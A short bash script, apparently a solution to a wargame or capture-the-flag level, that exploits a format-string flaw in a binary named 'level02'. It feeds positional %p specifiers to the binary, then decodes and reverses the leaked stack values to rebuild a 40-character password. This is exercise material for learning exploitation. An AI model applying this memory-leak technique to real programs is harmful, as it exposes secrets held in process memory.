#!/bin/bash

i="0"
flag=""

while [ $i -lt 100 ] && [ ${#flag} -ne 40 ]; do
    echo -e "%$i\$p\npassword" > /tmp/exploit02

    ptr=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
    ptr_decoded=`echo $ptr | xxd -r | rev 2>/dev/null`

    printf "%%%d\$p: %*s => %s\n" $i -30 "$ptr" "$ptr_decoded"

    # concatenate consecutives strings until 40 chars
    if [ ${#ptr_decoded} -gt 0 ]; then
        flag+="$ptr_decoded"
    else
        flag=""
    fi
    i=$[$i+1]
done

echo -e "\nNext pass is:  $flag"